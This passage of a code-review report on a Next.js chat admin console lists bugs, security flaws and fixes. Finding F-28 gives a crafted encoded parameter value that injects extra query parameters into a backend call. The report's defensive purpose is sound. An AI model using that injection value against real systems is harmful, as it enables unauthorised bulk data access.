  const timeDiff = Math.abs(new Date(msg.timestamp).getTime() - msgTime);
  return !(msg.text === newMessage.text && timeDiff < 5000);
});
return [...filtered, newMessage];
```

The filter drops **every** matching temp message, not the one corresponding to this
echo. Concrete failure: on a flaky connection the 3s `CONNECTION_WAIT_TIMEOUT`
flush (`:1617-1619`) REST-sends the agent's first "ok" → `temp-A`; the agent types
"ok" again 4s later, still disconnected → `temp-B`. When the socket recovers and
the server echoes both, the first echo strips **both** temps and appends one real
message. The agent sees one "ok" for two messages they sent.

**Fix:** carry a client-generated `client_msg_id` on every send and match echoes to
it. If the backend can't change, at minimum narrow to the single nearest-in-time
temp match instead of filtering all of them.

---

### F-13: High — Enter has no IME guard and no double-send guard
**Area:** Composer

**Where:** `components/chat/chat-component.tsx:1560-1568`

```tsx
const handleKeyPress = useCallback((e) => {
  if (e.key === "Enter" && !e.shiftKey) {
    e.preventDefault();
    handleSendMessage();
  }
}, [handleSendMessage]);
```

**IME:** there is no `isComposing` check anywhere in `components/chat/` — verified
by grep. Selecting a candidate in a Japanese/Chinese/Korean IME fires `keydown`
with `key === "Enter"` and `isComposing === true`; this handler calls
`preventDefault()` and sends a half-composed string. **Agents supporting
CJK-speaking customers cannot type at all.**

**Double-send:** the Send *button* is disabled during upload
(`message-input-area.tsx:189`) but Enter is not, and `handleSendMessage` doesn't
check `isUploadingImage`. `messageInput`/`selectedImage` are only cleared *after*
`await fetch("/api/chat-upload")` resolves (`:1487-1489`), so an Enter press during
the upload starts a second concurrent upload of the same file — the customer gets
the image twice.

**Fix:**

```tsx
if (e.key === "Enter" && !e.shiftKey && !e.nativeEvent.isComposing) {
  e.preventDefault();
  void handleSendMessage();
}
```

plus an in-flight guard at the top of `handleSendMessage` (`isSendingRef`), and
`readOnly={isUploadingImage}` on the textarea.

---

### F-14: High — Composer draft and pending image leak across conversations
**Area:** Composer

**Where:** `chat-component.tsx:166`, `:198-199`, `:1725-1729`

```tsx
const [messageInput, setMessageInput] = useState("");
const [selectedImage, setSelectedImage] = useState<File | null>(null);

useEffect(() => {
  if (!selectedPlayer) {
    setPendingPinMessageId(null);   // only pin state is reset
  }
}, [selectedPlayer]);
```

Nothing clears `messageInput` or `selectedImage` when `selectedPlayer` changes, and
`MessageInputArea` is mounted unconditionally against the shared state.

**Consequence:** an agent types half a refund explanation to player A, clicks
player B to check a balance, and hits Enter — sending A's context to B. In a
support console handling financial adjustments, that's a serious mistake.

**Fix:** key the composer on the conversation and hold drafts in a
`Map<userId, {text, file}>`, flushing on switch.

---

### F-15: High — 10 of 12 proxy routes have no upstream timeout
**Area:** Data

**Where:** all of `app/api/chat-*/route.ts` except `chat-online-players`

Only one route bothers:

```ts
// chat-online-players/route.ts:32
const controller = new AbortController();
const timeoutId = setTimeout(() => controller.abort(), 30000);
```

Every other route does a bare `await fetch(apiUrl, { method: 'GET', headers })`.

**Consequence:** if the backend accepts the connection and then stalls (slow ORM
query, Gunicorn worker starvation), the Next.js handler never resolves. Because
`use-chat-users.ts:954` re-fires `refreshActiveChats()` every 10s with no in-flight
guard ([F-19](#f-19-high--refreshactivechats-has-no-coalescing-abort-or-sequencing)),
these pile up one per 10s per stuck admin until the server's request slots are
exhausted — taking down unrelated routes. Client-side, the loading flags stay
`true` forever.

**Fix:** extract one `proxyFetch(url, { headers, timeoutMs })` helper with an
`AbortController` and use it in all twelve routes; return 504 on abort.

---

### F-16: High — Chat search proxy still has no timeout
**Area:** Data

> Self-inflicted gap from the search rework — flagging honestly.

`app/api/chat-search-players/route.ts` forwards `request.signal` and honours
cancellation, and short-circuits queries under 2 chars, but it has **no timeout of
its own**. If a caller connects and never aborts, that upstream request runs
indefinitely. `searchCache`'s TTL bounds how often a *new* request is made, but
doesn't bound any single one.

**Fix:** same `proxyFetch` helper as [F-15](#f-15-high--10-of-12-proxy-routes-have-no-upstream-timeout).
This is the one thing I'd change about the search work before shipping it.

---

### F-17: High — The 5-minute `allPlayers` cache is never invalidated
**Area:** Data

**Where:** `hooks/use-chat-users.ts:844-849`, read at `:782`

```ts
playersCacheRef.current = { data: transformedUsers, timestamp: now, … };
```

The cache is written on fetch and read on the fast path, but **nothing ever
invalidates it**. `handleManualAdjustmentPrimary` (`chat-component.tsx:2314-2336`)
patches local `selectedPlayer` state and calls `refreshActiveChats()` — which only
writes `activeChats`. `allPlayers` and `playersCacheRef` are untouched. The WS
balance patch at `use-chat-users.ts:447` updates `allPlayers` *state* but not the
cache, so a cache hit resurrects the pre-event value.

**Consequence:** after a manual balance adjustment, switching to the all-chats tab
re-renders the **pre-adjustment** balance, and it can persist for up to 5 minutes.
`chat-component.tsx:1009` compounds it — `balance: player.balance || existing.balance`
prefers the possibly-stale REST row over the fresh poll value.

**Fix:** export an `invalidatePlayersCache()` and call it from the mutation paths,
or key the cache on a `ledgerVersion` bumped by any mutation.

---

### F-18: High — Online players never appear without a manual refresh
**Area:** Realtime

**Where:** `hooks/use-online-players.ts:365-374`

```ts
if (isActive) {
  const exists = prev.some(p => p.user_id === playerId);
  if (!exists) {
    !IS_PROD && console.log(`➕ Adding player ${playerId} to online list`);
    // We might not have full player data, so trigger a background refresh
    return prev;            // ← no-op
  }
  return prev;              // ← no-op
}
```

Both branches `return prev`. The `live_status` event for a player not already in
the list is discarded, and since polling was removed (`:547-548 // No polling -
websocket handles real-time updates`), **nothing ever fetches them.** The log line
claims the opposite of what the code does.

**Consequence:** an admin watching the online tab will not see a player appear
until they hit manual refresh or reload. `REFRESH_INTERVAL` is still declared at
`:22` and unused; the JSDoc at `:132` still advertises a 60s poll.

**Fix:** call `fetchFromApi(true)` (debounced ~1s) when `isActive && !exists`, or
reinstate the low-frequency reconciliation poll.

---

### F-19: High — `refreshActiveChats` has no coalescing, abort, or sequencing
**Area:** Data

**Where:** `hooks/use-chat-users.ts:667-762`

This one function is invoked from the 10s interval (`:954`), **every** WS `message`
event (`:349`), `message_edited`/`message_deleted` (`:316`), `re_arrange` (`:615`),
and `chat-component.tsx:418` on every incoming message. There is no
`AbortController`, no in-flight flag, and no request-id check.

**Consequence:** a burst of 20 messages in a busy chat spawns 20 concurrent
100-row fetches, and whichever response lands **last** wins
`setActiveChats(transformedUsers)` (`:726`) — which can be the response to a request
issued *before* the newest message. The sidebar then shows a stale last-message for
up to 10 seconds.

**Fix:** a monotonic `refreshSeqRef` plus a single `refreshAbortRef`; ignore
responses that aren't the newest, and coalesce into a trailing timeout when one is
already in flight.

> `use-chat-websocket.ts:570-659` (message history) is the healthiest fetcher in the
> feature — it has an `AbortController`, a monotonic staleness guard, and correct
> page-1-only side effects. **Use it as the template** for this fix.

---

### F-20: High — `isAutoMessage` classifies every sidebar preview as a system card
**Area:** Rendering

**Where:** `components/chat/utils/message-helpers.ts:476-484` ·
`components/chat/sections/player-list-sidebar.tsx:153-158`

```ts
// Check if userId is 0 or undefined (system messages often have no user ID)
if (
  (message.userId === 0 || message.userId === undefined) &&
  !isPurchaseNotification(message) &&
  !isPrizeWheelMessage(message)
) {
  return true;
}
```

`userId` is optional (`types/chat.ts:43`) and this branch fires on **`undefined`**,
not just `0`. Any caller constructing a partial message gets *everything*
classified as a system notification — and the sidebar does exactly that:

```tsx
const mockMessage = { text: player.lastMessage };   // no userId, no type
const isAuto = isAutoMessage(mockMessage);
```

Trace: no signup-bonus copy → `message.type` undefined so the `autoTypes` check is
skipped → `userId === undefined` → **`true`**.

**Consequence:** every conversation preview in the player list is rendered as a
system transaction card (`player-list-sidebar.tsx:170-184`) — customer last-messages
get run through `removeAutomatedMessageHeading` (strips a leading `<b>…</b>`), have
their `Winnings:` line deleted, amounts recoloured and bolded, and are injected via
`dangerouslySetInnerHTML`.

> **Uncertain for the transcript:** I could not locate the mapper that builds
> `ChatMessage` from API/WS payloads, so I can't confirm whether it always populates
> `userId`. The sidebar false-positive is confirmed and traceable end to end. The
> fix is safe either way.

**Fix:** invert the test — a message is a system message only if it *looks* like
one, never because a field is absent:

```ts
if (message.userId === 0 && autoPatterns.some(p => p.test(clean) || p.test(raw))) return true;
```

---

### F-21: High — Avatar URL is rendered as visible text
**Area:** Rendering

**Where:** `components/chat/components/message-bubble.tsx:123` ·
typing indicator at `chat-component.tsx:3636`

```tsx
<div className="w-6 h-6 md:w-7 md:h-7 rounded-full bg-gradient-to-br from-blue-500 to-indigo-500 …">
  {selectedPlayer.avatar || selectedPlayer.username.charAt(0).toUpperCase()}
</div>
```

`ChatUser.avatar` is a **URL string** (`lib/chat/map-chat-api.ts:456`:
`avatar: chat.player.profile_pic || …`). For any player with an uploaded picture,
every one of their bubbles shows a clipped URL fragment inside a 24px circle
instead of their avatar. The same bug is in the typing indicator.

**Fix:** `{selectedPlayer.avatar ? <Image src={selectedPlayer.avatar} alt="" width={28} height={28} className="rounded-full object-cover" /> : initials}`

---

## 🟡 Medium

### F-22: Medium — Escape in any drawer destroys the whole console
**Area:** UX

**`components/chat/chat-drawer.tsx:22-31`**

A **document-level** Escape handler closes the chat drawer regardless of what
else is open. With the Manual-adjustment drawer open, Escape fires the drawer's
handler (none) *and* the chat drawer's handler → the agent loses the entire
three-column console, unsaved `balanceValue` / `balanceRemarks` included. That's an
operator losing in-flight financial input by pressing the universal dismiss key.

Also `add-game-drawer.tsx:79,82` sets `document.body.style.overflow = 'unset'`,
stomping the chat drawer's lock at `:14` — the two scroll-lock owners don't compose.

**Fix:** one shared `<Overlay>` primitive owning Escape (top-of-stack only), focus
trap, and a scroll-lock counter. Remove the chat drawer's global Escape in favour
of it.

---

### F-23: Medium — deep-link selection implemented eight times
**Area:** State

**`chat-component.tsx:2436`, `:2480`, `:2745`, `:2783`, `:2839`, `:3116`, `:3177`**

Six effects plus a scroll effect, each re-implementing the same ~15-line transition
(`setActiveTab` → `setSelectedPlayer` → `setPendingPinMessageId(null)` →
`setMobileView("chat")` → `markChatAsReadDebounced` → `setTimeout(router.replace, 100)`)
at eight separate sites.

The `else if` at `:2703` is **unreachable**: `candidate` was assigned in the
`if (!candidate)` block at `:2524` (which always returns at `:2604`) or found by
the `.find()` at `:2509`, so by `:2607` it is truthy or the code already exited.

**Consequence:** any change to selection semantics needs eight edits, and
[F-8](#f-8-high--deep-links-are-read-then-erased-the-back-button-is-broken)'s URL bug is
duplicated eight times rather than fixed once.

**Fix:** collapse to one effect keyed on `[queryPlayerId, queryUsername, resolvedPlayer]`
with a single extracted `selectPlayer(player)` callback shared with the list click handler.

---

### F-24: Medium — inline props defeat `React.memo` on three children
**Area:** Perf

**`chat-component.tsx:237-342`, `:3437-3439`, `:1959`, `:3658`**

- `MessageInputArea` is memoised but receives a **freshly-allocated 105-element
  array** built every render (`const commonEmojis = [...]` at `:237-342`). It's
  constant — every keystroke re-renders the whole composer.
- `PinnedMessagesSection` is memoised but gets an inline closure at `:3437-3439`.
- `MessageBubble` is memoised and N copies render, but `handleTogglePin`'s deps are
  `[selectedPlayer, pendingPinMessageId, addToast, updateMessagePinnedState]`
  (`:1959`). Since `setSelectedPlayer` fires on **every** `balanceUpdated` event
  (`:442`), the callback identity changes often → **every bubble re-renders on
  balance events**.

**Fix:** hoist `commonEmojis` to module scope; `useCallback` the toggle; key the
bubble handlers off `playerId` rather than the whole `selectedPlayer` object.

---

### F-25: Medium — pagination appends blindly onto a reordering list
**Area:** Data

**`hooks/use-chat-users.ts:914`**

```ts
setAllPlayers(prev => [...prev, ...transformedUsers]);
```

The underlying list is sorted by last-message time, which changes between requests
(the 10s poll and WS both reorder it). With offset pagination, one new message
shifts every row by one position, so page 2 re-serves the row that was last on
page 1. No dedupe by `user_id` → duplicate rows (plus React duplicate-key warnings)
and one silently skipped player.

**Fix:** dedupe on append, or switch the backend to a stable cursor ordered by
`chatroom_id`.

**Related:** the cache-hit path (`:782-790`) never restores pagination state or
`playersWithChatsTotalCount`, so a cache hit can leave `currentPage` at 3 while
`allPlayers` holds only page 1 — the next `loadMorePlayers()` then requests page 4
and pages 2-3 are never loaded.

---

### F-26: Medium — 404 is rewritten as success-with-an-empty-array
**Area:** Data

**`app/api/chat-messages/route.ts:70-77`, `chat-purchases:73-80`,
`chat-cashouts:51-53`, `chat-game-activities:42-44`**

```ts
if (response.status === 404) {
  return NextResponse.json({ status: 'success', messages: [], message: 'No message history available…' });
}
```

In Django a 404 usually means "route/permission/object not found", not "this chat
is empty". Converting it to a 200 with an empty array means the agent **cannot tell
"no purchases yet" from "we couldn't load this player's purchases"**.

**Fix:** drop the 404→200 rewrite, or return a distinguishable `{status:'error',
code:'not_found'}` and let the UI render it differently from an empty list.

---

### F-27: Medium — proxy routes leak JWT prefixes and backend errors
**Area:** Security

**Two separate leaks:**

**(a) JWT prefixes in logs.** Seven routes log the first 23 characters of the
admin's bearer token, unconditionally (not behind `!IS_PROD`):

```ts
// chat-messages/route.ts:32 and 6 siblings
console.log('🔑 Authorization header:', authHeader ? `Bearer ${authHeader.substring(7, 30)}...` : 'MISSING');
```

That's the full JWT header plus the start of the payload — which for this backend
contains the admin's user id, role, and expiry.

**(b) Raw backend error bodies proxied to the browser.**

```ts
// chat-messages/route.ts:79-86 and 4 siblings
message: `Backend error: ${response.status} ${response.statusText}`,
detail: errorText.substring(0, 200),
```

Django's default 500 body frequently contains the exception type, the failing
query, and sometimes field values. `use-chat-users.ts:805` turns this into the
chat-list error banner, so it's rendered in the admin UI.

**Fix:** log `authHeader ? 'present' : 'MISSING'`. Log `errorText` server-side at
full length; return a fixed generic `message` plus a `requestId`, keeping the
numeric upstream status only as a `upstreamStatus` field.

---

### F-28: Medium — client params interpolated into the upstream URL
**Area:** Security

**`app/api/chat-messages/route.ts:7-8, 22-25`, `chat-purchases:25-28`,
`chat-cashouts:21-24`, `chat-all-players:11-17`**

```ts
const identifierParam = chatroomId ? `chatroom_id=${chatroomId}` : `user_id=${userId}`;
const apiUrl = `${backendUrl}/api/v1/admin/chat/?${identifierParam}&request_type=recent_messages&page=${page}&per_page=${perPage}`;
```

Values from `searchParams.get()` are already percent-decoded, so a crafted
`chatroom_id=1%26request_type%3Dall_players%26page_size%3D100000` re-injects extra
parameters into the Django call, overriding `request_type` and `page_size`.
`per_page`/`page_size` are unvalidated, so `page_size=100000` asks for the whole
player table in one response.

`chat-game-activities/route.ts:12-15` has **no required-parameter check at all** —
omitting `user_id` proxies a full-platform game-activity dump. (Its siblings
`chat-purchases`/`chat-cashouts` do have the guard, so this looks like an omission.)

**Fix:** build params with `new URLSearchParams({...})`, clamp `per_page`/`page_size`
to a max, and add the missing `if (!userId) return 400`.

> **Uncertain:** whether Django itself caps `page_size` — needs backend confirmation.

---

### F-29: Medium — a 10s poll runs app-wide, forever
**Area:** Data

**`hooks/use-chat-users.ts:950-956`, mounted at `components/layout/dashboard-layout.tsx:64`**

```ts
const POLL_INTERVAL_MS = 10_000;
const interval = setInterval(() => void refreshActiveChats(), POLL_INTERVAL_MS);
```

`ChatUsersProvider` wraps the **entire** dashboard layout, so an admin on the
transactions page for an hour still issues ~360 `all_players&page_size=100` requests.
There's no `document.visibilityState` check, so backgrounded tabs keep polling.
Multiplied by N concurrent admins, this is the dominant load on the Django chat view.

**Fix:** gate on `document.visibilityState === 'visible'` and pause on
`visibilitychange`; consider mounting the provider only on the chat route.

---

### F-30: Medium — Accessibility gaps in the shell
**Area:** A11y

| Issue | Where |
|---|---|
| No focus management across the three mobile panels — back buttons move the view but not focus, dropping keyboard/SR users to `<body>` | `chat-component.tsx:3370`, `player-info-sidebar.tsx:146` |
| Player list has **no ARIA structure** — rows are anonymous `<button>`s; `role="tablist"`, `role="option"`, `aria-selected` appear **zero** times in the whole component tree | `player-list-sidebar.tsx:104` |
| Transcript isn't keyboard-scrollable — `overflow-y-auto` with no `tabIndex`, so arrow keys can't traverse history (WCAG 2.1.1) | `chat-component.tsx:3444-3455` |
| `aria-live="polite"` wraps the **entire** transcript, so backfilled history gets announced in bulk and buries the one new customer message | `chat-component.tsx:3444-3448` |

**Fix:** move focus to the target panel's heading on panel change (`tabIndex={-1}` +
`ref.focus()`); add `role="tablist"`/`role="tab"`/`aria-selected` to the switcher
and `role="listbox"`/`role="option"` to rows; give the scroller `tabIndex={0}`; move
the live region to a visually-hidden node updated only on genuinely new bottom messages.

**Already correct:** `chat-component.tsx:3446-3448` uses `role="log"` properly, and
the search input wires `aria-label` + `aria-describedby` to a live hint
(`player-list-sidebar.tsx:393-394`).

---

### F-31: Medium — Six overlays, inconsistent Escape/focus/scroll-lock
**Area:** A11y

| Component | Escape | `aria-modal` | Focus trap | Scroll lock |
|---|---|---|---|---|
| `modals/edit-balance-drawer.tsx` | ❌ | ✅ | ❌ | ❌ |
| `modals/edit-spins-drawer.tsx` | ❌ | ✅ | ❌ | ❌ |
| `modals/notes-drawer.tsx` | ❌ | ✅ | ❌ | ❌ |
| `modals/edit-profile-drawer.tsx` | ❌ | ❌ | ❌ | ❌ |
| `modals/add-game-drawer.tsx` | ✅ | ✅ | ❌ | ✅ |
| `modals/expanded-image-modal.tsx` | ✅ | ❌ | ❌ | ❌ |

Only 2 of 6 handle Escape. The image modal has no `role="dialog"`, no focus move on
open, no focus restore on close, and no trap — Tab walks through the hidden
transcript underneath. The expanded-image trigger is a bare `onClick` on a `div`
(`message-bubble.tsx:403-407`): not focusable, not activatable by Enter/Space.

**Fix:** one `<Overlay>` primitive (see [F-22](#f-22-medium--escape-in-any-drawer-destroys-the-whole-console)).

---

## 🔵 Low

### F-32: Low — dead code inventory
**Area:** Misc

Verified: **zero references** outside their own definitions and barrel exports.

| File | Lines | Note |
|---|---|---|
| `components/chat/sections/messages-container.tsx` | 162 | A near-duplicate of the markup inlined at `chat-component.tsx:3508-3590`. **Would not compile if re-enabled** — declares props `isUserAtLatest`/`scrollToLatest` while the hook returns `isUserAtBottom`/`scrollToBottom`. |
| `components/chat/hooks/use-viewport-messages.ts` | 214 | Windowing logic. Do **not** re-enable as-is. |
| `components/chat/hooks/use-message-cache.ts` | 237 | Also has an unbounded module-level `globalCache` and a key that collides across unresolved deep links (`chat_null_user_null`). |
| `components/chat/components/error-boundary.tsx` | 105 | The fix for [F-5](#f-5-critical--the-error-boundary-is-never-mounted) is to *mount* it, not delete it. |
| `lib/api/chat.ts` | 57 | `sendChatMessageToPlayer` has 1 reference (its own definition). Duplicates the live send path with weaker logic and swallows all failures. Delete so nobody wires it up. |
| `app/api/chat-users/route.ts` | 65 | No callers, and the only route with no auth check. |

Plus dead members inside live files:
- `chat-component.tsx:212-214` — three refs guarding behaviour that doesn't exist.
  `isRefreshingMessagesRef` is **never set to `true`** (so all 5 guards are
  permanently-false branches), `refreshTimeoutRef` is **never assigned a timeout**,
  `scrollPositionBeforeRefreshRef` is **never read**. The comment at `:3304` —
  *"🔴 CRITICAL: Don't auto-scroll if we're refreshing messages"* — guards dead
  code, and would convince a reviewer that protection exists. It doesn't.
- `chat-component.tsx:3564-3566` — `displayedMessageIdsRef` is mutated during
  render (unsafe under React 19 concurrent rendering, double-invoked in
  StrictMode), grows unbounded, and is never read by any logic.
- `player-info-sidebar.tsx:34-43, 50-58, 89-143, 628-664` — 3 suppressed props
  threaded from the orchestrator purely to be discarded; 6 states whose setters are
  only ever called with `null`/`false`, making 3 modals permanently unopenable and
  ~55 lines of handlers (including two live `playersApi` mutation paths) unreachable.
- `chat-drawer.tsx` + `chat-drawer-context.tsx` — `openDrawer`'s only caller is in
  `control-grid.tsx`, which **is itself never rendered**. `isOpen` is permanently
  `false`, so all 58 lines are inert — including the Escape handler from
  [F-22](#f-22-medium--escape-in-any-drawer-destroys-the-whole-console).
  `aria-labelledby="chat-drawer-title"` points at an id that exists nowhere.

**Estimated total: ~700 unreachable lines.**

---

### F-33: Low — Smaller rendering and correctness nits
**Area:** Misc

| Issue | Where |
|---|---|
| Raw ISO timestamps render when `time` is absent — `time` is optional, `timestamp` is a required ISO string, so some paths show `2026-09-29T11:00:00.000Z` next to the bubble. No `formatMessageTime` counterpart exists. | `message-bubble.tsx:544-546`, `pinned-messages-section.tsx:110` |
| KYC "Verify" CTA and `formatKycBodyWithBoldAction` are **unreachable** — `KycVerificationMessage` only mounts when `kind === 'approved'`, so the `kind === 'prompt'` branch is always false. Unapproved KYC messages fall through to the transaction renderer and get amounts bolded/coloured. | `message-helpers.ts:266-272`, `message-bubble.tsx:104-106`, `:311-314`, `:345-361` |
| Textarea doesn't shrink when cleared — the ✕ button calls `setMessageInput('')` directly, bypassing `onChange`, so the inline height style is never recomputed and the composer stays at its previous 300px. Emoji insert has the same gap. | `message-input-area.tsx:98-104`, `:171-181` |
| Image URLs stripped with a freshly compiled `RegExp` per URL per render, and stripped from inside `href` too — so `<a href="…x.jpg">…x.jpg</a>` becomes a dead unclickable link. | `message-bubble.tsx:501-507` |
| `parseTransactionMessage` runs twice per system row (`:220` and again inside `formatTransactionMessage`) — ~20 `String.match` calls plus 2 more DOM parses, then `transactionTypeToVisualKind` applied twice. | `message-bubble.tsx:220-237`, `message-helpers.ts:828-833` |
| Two `new Date()` allocations + non-ISO string parses per row per render, just to decide whether to show an avatar. `new Date("2000-01-01 25:00")` is implementation-defined, so grouping is unreliable. | `chat-component.tsx:3541-3551` |
| Inbound images use `unoptimized`, bypassing next/image entirely — no resizing, no format negotiation. The 10MB cap only applies to *outgoing* uploads, so 4 customer phone photos ≈ 16MB per agent tab. | `message-bubble.tsx:415-425` |
| Delete-confirm `autoFocus` lands on the **destructive** button — a keyboard user hitting Space deletes a customer message. `role="alertdialog"` is also wrong for an inline non-modal confirm, and Escape only works via `onKeyDown` on a non-focusable wrapper. | `message-bubble.tsx:672-690` |
| No per-conversation scroll restoration — switching conversations always slams to the bottom, so an agent reading back through yesterday's thread loses their place. | `use-scroll-management.ts:283-307` |
| New-message affordance shows a bare dot with no count — an agent can't tell if 1 or 50 arrived. The `unseenMessageCount` badge exists only in the dead `messages-container.tsx:118-137`, lost when the markup was inlined. | `chat-component.tsx:3618-3623` |
| `handlePlayerSelect` dep array lists `markChatAsRead` (never invoked) and omits `markChatAsReadDebounced` (which the body calls at `:1688`), with an `eslint-disable` hiding it. If that context method's identity changes, selecting a player never marks it read. | `chat-component.tsx:1714-1716` |
| `hasNewMessagesWhileScrolled` and `spinBalanceRefreshKey` are derived-but-stored, costing an extra full render per message and a fetch-on-rerender hack respectively. | `chat-component.tsx:203-204`, `:189`, `:2174` |
| `chat-component.tsx:3739` casts away nullability the child already handles (`selectedPlayer as ChatUser`), and the drawer renders unconditionally including when null. | `chat-component.tsx:3739` |
| 46 `console.*` calls in the orchestrator, 13 of them full-array scans inside a memo whose deps are all WebSocket-fed. Cost is paid exactly when debugging this screen. Gate on a dedicated `DEBUG_CHAT` flag rather than `!IS_PROD`. | `chat-component.tsx:787-1220` |
| `ChatDrawerContext` value object and all three methods are recreated every render. | `contexts/chat-drawer-context.tsx:17-22` |
| `gamesPlayed` silently falls back to `gems` — a **currency balance** — when `games_played` is absent. Also `\|\| undefined` turns a legitimate `0` into `undefined` for `winRate` in three places. | `map-chat-api.ts:533`, `resolve-chat-user-for-deep-link.ts:87-90` |
| 38 unreachable lines in the deep-link resolver — line 162 returns when `!profileUser`, so the username-search fallback at `:166-199` (including a second search round trip) can never execute. | `resolve-chat-user-for-deep-link.ts:162-199` |
| `loadMorePlayers` unconditional cache nulling (`:926`) is the *only* invalidation in the hook — evidence [F-17](#f-17-high--the-5-minute-allplayers-cache-is-never-invalidated)'s cache isn't part of the design. | `hooks/use-chat-users.ts:926` |
| `chat-send` retries on 400 with a different body shape, dropping `sender_id`/`is_player_sender`. If the 400 was unrelated, this issues a second real send. | `app/api/chat-send/route.ts:37-47` |
| `chat-upload` returns Cloudinary env var names in its error `detail` to any caller. | `app/api/chat-upload/route.ts:38` |
| `baseDelay`/`maxDelay` are dead config — `attemptReconnection` computes delay solely from `wsReconnectDelayMs` and never reads them. `managed.lastActivity` is tracked and never read. | `use-chat-websocket.ts:1352-1354`, `websocket-manager.ts:137` |
| Abort listeners accumulate one-per-send on the room signal; never removed. | `use-chat-websocket.ts:1396-1405` |
| Room-provenance check is fail-open: 3 of its 4 disjuncts mean "accept it", so an edit/delete from another room can apply. The `typing` branch has **no** room or sender check at all. | `use-chat-websocket.ts:1030-1042`, `:1221-1230` |
| `refreshInFlight` latches permanently after a "no refresh token" failure — the `finally` runs synchronously *before* the outer assignment stores the promise, so the cleanup is immediately overwritten. Token refresh is dead for the rest of the session. | `ensure-fresh-access-token.ts:23-70` |
| `isHistoryLoading` can latch `true` — the guard returns *before* the `try`, so the `finally` never runs and `loadOlderMessages` is permanently disabled for that room. | `use-chat-websocket.ts:577-582` |
| `onMessageReceived` fires even for messages the state layer rejected as duplicates — the dedup decision is inside the `setMessages` updater, but the list callback is invoked unconditionally. | `use-chat-websocket.ts:1180-1217` |
| Socket send has no optimistic entry, no ack, no rollback. A message sent in the last moments before a socket dies vanishes with only a generic banner. And REST-sent `temp-` messages are permanently un-editable if the echo never arrives (`:1640-1642` refuses to act on `temp-` ids forever). | `use-chat-websocket.ts:1572-1588`, `:1640-1642` |
| `onMaxReconnectAttemptsReached` is never supplied, so after ~63s of backoff the UI keeps claiming "Connection lost, reconnecting…" forever. Recovery requires switching players or reloading. | `use-chat-websocket.ts:941-1344` |
| The queued-message flush in `disconnect()` is unreachable on room switch and unmount — React runs all effect destroys before any creates, so the queue is already cleared and `isMountedRef` already false. | `use-chat-websocket.ts:1533-1552` |
| REST send retries with no idempotency key — if the POST commits but the response is lost, the retry creates a **duplicate customer-facing message**. | `use-chat-websocket.ts:1436-1451` |
| Page-1 history is fetched twice per conversation open, and the first request is aborted by the second. One wasted round trip each time. | `use-chat-websocket.ts:788-805` |
| `fetchPurchaseHistory` is never destructured by the caller — a 70-line network round trip whose result is discarded, duplicating what `usePlayerPurchases` already fetches. | `use-chat-websocket.ts:662-783` |
| `refreshActiveChats` swallows all failures and never clears a stale error banner; a 401 is silently retried every 10s instead of redirecting to login the way the WS hook does. | `use-chat-users.ts:680-683` |
| `add_new_chats` merge wipes `winningBalance` while every sibling field uses `?? existing` — a whole-list snapshot that omits the field erases real winnings. | `use-chat-users.ts:489-494` |
| `useOnlinePlayers`' cache is never updated by the WebSocket it depends on, so a non-forced refetch **resurrects players who already went offline**. | `use-online-players.ts:313-318` |
| Stale `effectiveEnabled` closures in three callbacks — deps use `enabled`, bodies read `effectiveEnabled`, so an AGENT role resolving late still triggers fetches and socket connects. | `use-online-players.ts:477`, `:519`, `:553` |
| `usePlayerGameActivities` has no cancellation and no request-id guard; `playersApi.gameActivities` doesn't accept an options bag so no signal can be threaded through — unlike its siblings. | `use-player-game-activities.ts:37-93` |
| Two page sizes (100 vs 50) for the same endpoint from the same Django view, with both writing the same shared count state — the badge and the list length disagree. | `use-chat-users.ts:673` vs `:796` |
| `updateMessagesBalance` accepts `winningBalance` and discards it. | `use-chat-websocket.ts:1755-1781` |

---

## Recommended sequence

Fixing the top of this list is genuinely cheap — the first three are small, surgical
diffs that each close a real hole. Virtualisation is the one item that needs a
dependency and a design decision, so it goes last, once per-row cost is small.

### Phase 1 — Security & resilience (do first, ~1 day)

| Finding | Effort | Why now |
|---|---|---|
| [F-1](#f-1-critical--player-text-is-rendered-as-raw-html) XSS | ~1h | Remotely reachable by any player; admin-session compromise. Add `dompurify`, route all 4 sinks through one helper. |
| [F-2](#f-2-critical--chat-upload-never-validates-the-token) | ~1h | Anonymous upload. Verify the token, validate by magic bytes, cap size. |
| [F-5](#f-5-critical--the-error-boundary-is-never-mounted) | ~15min | 3 lines, removes the "everything dies" path. |
| [F-6](#f-6-critical--usesearchparams-with-no-suspense-boundary) | ~15min | 3 lines, matches existing house style. |
| [F-27](#f-27-medium--proxy-routes-leak-jwt-prefixes-and-backend-errors) | ~30min | Log one word instead of a token prefix. |

### Phase 2 — Correctness bugs an agent hits daily (~2 days)

| Finding | Effort | Why |
|---|---|---|
| [F-7](#f-7-high--one-shared-debounce-drops-updates-for-all-but-one-chat) | ~1h | Per-chat debounce, or drop it. |
| [F-20](#f-20-high--isautomessage-classifies-every-sidebar-preview-as-a-system-card) | ~1h | Customer messages currently render as transaction cards. |
| [F-21](#f-21-high--avatar-url-is-rendered-as-visible-text) | ~30min | Visible on every message from any player with a picture. |
| [F-13](#f-13-high--enter-has-no-ime-guard-and-no-double-send-guard) | ~1h | CJK agents can't type; images send twice. |
| [F-14](#f-14-high--composer-draft-and-pending-image-leak-across-conversations) | ~2h | Sends A's context to B. In a financial-adjustment tool, this is serious. |
| [F-10](#f-10-high--balance-ticks-wipe-winnings-and-rebuild-the-whole-message-array) | ~1h | Winnings flicker to empty; also an O(n) rebuild. |
| [F-12](#f-12-high--temp-id-dedup-collapses-two-real-messages-into-one) | ~1h | Agent's own messages disappear. |
| [F-17](#f-17-high--the-5-minute-allplayers-cache-is-never-invalidated) | ~1h | Stale balances after an adjustment. |
| [F-18](#f-18-high--online-players-never-appear-without-a-manual-refresh) | ~30min | One-line fix to a branch that already logs a lie. |

### Phase 3 — Request hygiene (~1 day)

One shared `proxyFetch(url, {headers, timeoutMs})` helper, then apply to all 12
routes, closing [F-15](#f-15-high--10-of-12-proxy-routes-have-no-upstream-timeout) and
[F-16](#f-16-high--chat-search-proxy-still-has-no-timeout) together. Then
[F-19](#f-19-high--refreshactivechats-has-no-coalescing-abort-or-sequencing) (use
`use-chat-websocket.ts:570-659` as the template) and
[F-29](#f-29-medium--a-10s-poll-runs-app-wide-forever) (visibility gating).

### Phase 4 — Rendering performance (~2 days)

The highest perceived-smoothness win, and the direct answer to Sam's "doesn't feel
smooth":

1. [F-4](#f-4-critical--scroll-state-re-renders-the-whole-transcript-on-every-frame) step 1 — `WeakMap` classification cache. **Smallest diff, biggest win** (19 parses/row → 1).
